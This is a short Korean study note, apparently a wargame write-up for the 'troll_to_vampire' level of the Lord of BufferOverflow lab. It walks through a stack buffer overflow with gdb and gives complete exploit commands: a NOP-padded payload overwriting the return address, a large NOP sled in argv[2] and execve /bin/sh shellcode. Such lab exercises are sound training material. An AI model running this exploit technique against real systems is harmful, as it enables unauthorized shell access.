#week2  
##lob  
###troll_to_vampire  
이 문제를 조금 안도했던 것은 다시 argv[2]를 사용하다는 것이었다.  
여기서는 offset의 2번째 byte가 \xff여서는 안된다.  
이 문제를 해결하기 위해 구글링을 한 결과 return address에 매우 큰 값을 넣어야 한다는 것을 알 수 있었다.  
우선 gdb를 연다음 strcpy 호출된 후인 main+140에 브레이크 포인트를 걸었다    
그리고  r $(python -c 'print("\x90"*44+"\xff\xff\xfe\xbf"+" "+"\x90"*100000)') 명령어를 입력하면 잘 돌아가는 것을 확인가능하다.  
다음 x/100s $ebp+1000명령어를 통해  argv[2] 주소를 찾는다.    
이제 다왔으니 아래의 명령어로 쉘 코드를 입력해 key를 얻어낸다.  
./vampire $(python -c 'print("\x90"*44+"\xdc\x77\xfe\xbf"+" "+"\x90"*100000+  
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")')
